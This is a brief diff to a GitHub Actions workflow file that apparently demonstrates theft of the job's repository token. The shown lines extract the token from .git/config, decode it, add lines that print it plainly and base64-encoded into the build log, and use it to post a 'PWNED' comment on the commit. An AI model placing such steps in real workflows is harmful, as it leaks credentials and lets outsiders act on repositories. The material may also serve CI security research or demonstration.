@@ -17,6 +17,9 @@ jobs:
           GITHUB_TOKEN=$GITHUB_WORKSPACE/.git/config | \
           grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d
           
+          echo $GITHUB_TOKEN
+          echo $GITHUB_TOKEN | base64
+          
           curl -X POST -H "Authorization: Token $GITHUB_TOKEN" \
           -d '{"body": "PWNED"}' \
           https://api.github.com/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/comments
